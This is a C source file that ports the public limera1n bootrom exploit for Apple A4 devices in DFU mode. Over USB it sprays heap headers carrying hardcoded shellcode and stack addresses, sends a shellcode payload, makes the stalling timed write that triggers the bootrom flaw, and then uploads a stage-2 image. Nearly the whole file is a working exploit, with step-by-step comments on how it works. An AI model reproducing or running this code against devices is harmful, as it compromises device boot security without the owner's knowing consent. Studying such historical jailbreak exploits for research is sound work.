/*
 * a4boot: limera1n-pwn an A4 device and upload a stage-2 image, in one pass.
 *
 * Faithful port of syringe/exploits/limera1n/limera1n.c (non-Apple path):
 *
 *   1. reset DFU counters (0x21/4)
 *   2. spray 0x40-byte heap headers
 *   3. fill to 0x2C000
 *   4. send shellcode chunk
 *   5. read 0x800 (must complete before step 6)
 *   6. 0xBB write with a 10 ms timeout  <- the vulnerability
 *   7. trigger: 0x21/2, wLength 0 (expected to time out on a successful pwn)
 *   8. syringe's irecv_reset + irecv_finish_transfer (DNLOAD(0) + 3x status +
 *      reset) + reconnect, to resynchronise the payload's DFU loop
 *   9. upload the stage-2 image and manifest it (DNLOAD(0) + status + reset)
 *
 * The stage-2 image must be an ENCRYPTED IMG3 (e.g. iBSS.n92ap.img3): the
 * pod2g payload (limera1n.S) searches the received image for DATA + KBAG
 * tags and GID-decrypts it itself. A raw decrypted .bin fails the tag
 * search and the payload just waits for another image.
 *
 * Usage: a4boot <limera1n-payload> <img3-image> [reset]
 *
 * Pass "reset" on a native host (macOS/Linux): the image is only executed
 * after a real USB bus reset. Do not pass it over USB/IP, where a reset
 * only resets the virtual port and drops the usbipd binding.
 */
#include <libusb-1.0/libusb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define VID 0x05AC
#define PID 0x1227
#define CHUNK 0x800
#define MAX_SIZE 0x2C000u
#define STACK_ADDRESS 0x8403BF9Cu
#define SHELLCODE_ADDRESS 0x8402B001u
#define DFU_DNLOAD_IDLE 5

static libusb_device_handle *handle;

static libusb_device_handle *open_dfu(libusb_context *ctx, int attempts, int delay_ms)
{
    for (int i = 0; i < attempts; i++) {
        libusb_device_handle *h = libusb_open_device_with_vid_pid(ctx, VID, PID);
        if (h) {
            libusb_set_configuration(h, 1);
            if (libusb_claim_interface(h, 0) == 0)
                return h;
            libusb_close(h);
        }
        usleep(delay_ms * 1000);
    }
    return NULL;
}

static int ctrl(uint8_t request, unsigned char *data, uint16_t length, unsigned timeout)
{
    int rc = libusb_control_transfer(handle, 0x21, request, 0, 0, data, length, timeout);
    if (rc < 0)
        fprintf(stderr, "  request %u len %u: %s\n", request, length, libusb_error_name(rc));
    return rc;
}

static int dfu_status(void)
{
    unsigned char st[6] = {0};
    if (libusb_control_transfer(handle, 0xA1, 3, 0, 0, st, sizeof(st), 2000) < 0)
        return -1;
    return st[4];
}

static int upload(const char *path, int manifest)
{
    FILE *f = fopen(path, "rb");
    if (!f) {
        perror(path);
        return -1;
    }
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);
    unsigned char *buf = malloc(size ? size : 1);
    if (fread(buf, 1, size, f) != (size_t) size) {
        fprintf(stderr, "short read on %s\n", path);
        fclose(f);
        free(buf);
        return -1;
    }
    fclose(f);

    printf("uploading %s (%ld bytes, %ld chunks)\n", path, size, (size + CHUNK - 1) / CHUNK);
    fflush(stdout);
    for (long off = 0; off < size; off += CHUNK) {
        long n = size - off;
        if (n > CHUNK)
            n = CHUNK;
        if (ctrl(1, buf + off, (uint16_t) n, 3000) < 0) {
            free(buf);
            return -1;
        }
        int status = dfu_status();
        if (status != DFU_DNLOAD_IDLE) {
            fprintf(stderr, "  bad DFU status %d at offset %ld\n", status, off);
            free(buf);
            return -1;
        }
    }
    free(buf);

    if (manifest) {
        printf("manifesting\n");
        fflush(stdout);
        ctrl(1, NULL, 0, 3000);
        for (int i = 0; i < 3; i++)
            dfu_status();
    }
    return 0;
}

int main(int argc, char **argv)
{
    if (argc < 3) {
        fprintf(stderr, "usage: %s <limera1n-payload> <ibss-image> [reset]\n", argv[0]);
        return 1;
    }
    int do_reset = (argc > 3 && strcmp(argv[3], "reset") == 0);

    unsigned char payload[CHUNK];
    memset(payload, 0, sizeof(payload));
    FILE *pf = fopen(argv[1], "rb");
    if (!pf) {
        perror(argv[1]);
        return 1;
    }
    size_t got = fread(payload, 1, sizeof(payload), pf);
    fclose(pf);
    printf("exploit payload: %zu bytes\n", got);

    libusb_context *ctx = NULL;
    if (libusb_init(&ctx) < 0)
        return 1;
    libusb_set_option(ctx, LIBUSB_OPTION_LOG_LEVEL, LIBUSB_LOG_LEVEL_WARNING);

    handle = open_dfu(ctx, 3, 500);
    if (!handle) {
        fprintf(stderr, "no 05ac:1227 DFU device\n");
        return 1;
    }

    printf("reset counters\n");
    fflush(stdout);
    ctrl(4, NULL, 0, 1000);

    printf("heap headers\n");
    fflush(stdout);
    unsigned char buf[CHUNK];
    memset(buf, 0xCC, sizeof(buf));
    for (unsigned i = 0; i < CHUNK; i += 0x40) {
        unsigned *hdr = (unsigned *) (buf + i);
        hdr[0] = 0x405;
        hdr[1] = 0x101;
        hdr[2] = SHELLCODE_ADDRESS;
        hdr[3] = STACK_ADDRESS;
    }
    ctrl(1, buf, CHUNK, 1000);

    printf("filler\n");
    fflush(stdout);
    memset(buf, 0xCC, sizeof(buf));
    for (unsigned sent = 0; sent < MAX_SIZE - (CHUNK * 3); sent += CHUNK)
        ctrl(1, buf, CHUNK, 1000);

    printf("shellcode\n");
    fflush(stdout);
    ctrl(1, payload, CHUNK, 1000);

    printf("fake read\n");
    fflush(stdout);
    unsigned char rbuf[CHUNK];
    libusb_control_transfer(handle, 0xA1, 1, 0, 0, rbuf, CHUNK, 1000);

    printf("stalling write (sync, 10 ms timeout)\n");
    fflush(stdout);
    memset(buf, 0xBB, CHUNK);
    libusb_control_transfer(handle, 0x21, 1, 0, 0, buf, CHUNK, 10);

    printf("trigger\n");
    fflush(stdout);
    libusb_control_transfer(handle, 0x21, 2, 0, 0, NULL, 0, 1000);

    /* syringe: irecv_reset + irecv_finish_transfer + irecv_reconnect(2).
     * The payload is now in its usb_wait_for_image loop; the finish
     * transfers resynchronise the DFU state machine before the real image. */
    printf("reset + finish transfer\n");
    fflush(stdout);
    libusb_reset_device(handle);
    ctrl(1, NULL, 0, 1000);
    dfu_status();
    dfu_status();
    dfu_status();
    libusb_reset_device(handle);

    sleep(2);
    libusb_close(handle);
    handle = open_dfu(ctx, 10, 500);
    if (!handle) {
        fprintf(stderr, "device gone after exploit\n");
        return 1;
    }
    printf("device present after exploit\n");
    fflush(stdout);

    if (upload(argv[2], 1) < 0) {
        fprintf(stderr, "image upload failed (bootrom probably not pwned)\n");
        return 1;
    }
    if (do_reset) {
        printf("resetting bus to boot image\n");
        fflush(stdout);
        libusb_reset_device(handle);
    }
    printf("image sent\n");
    fflush(stdout);

    libusb_close(handle);
    libusb_exit(ctx);
    return 0;
}
